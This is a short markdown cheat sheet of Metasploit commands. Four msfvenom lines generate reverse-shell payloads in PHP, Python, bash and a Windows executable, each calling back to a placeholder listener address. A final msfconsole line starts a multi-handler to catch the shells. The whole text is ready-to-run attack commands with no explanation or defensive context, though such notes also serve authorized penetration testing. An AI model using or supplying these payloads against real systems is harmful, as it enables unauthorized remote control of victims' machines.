# msfvenom

## Reverse TCP

msfvenom -p php/meterpreter_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4444 -f raw > shell.php\
msfvenom -p cmd/unix/reverse_python LHOST=xx.xx.xx.xx LPORT=4444 -f raw > shell.py\
msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx.xx.xx LPORT=4444 -f raw > shell.sh\
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=xxx.xxx.xxx.xxx -f exe -e generic/none -o ./2.exe

## Run msf rc script.

msfconsole -r multihandler.rc
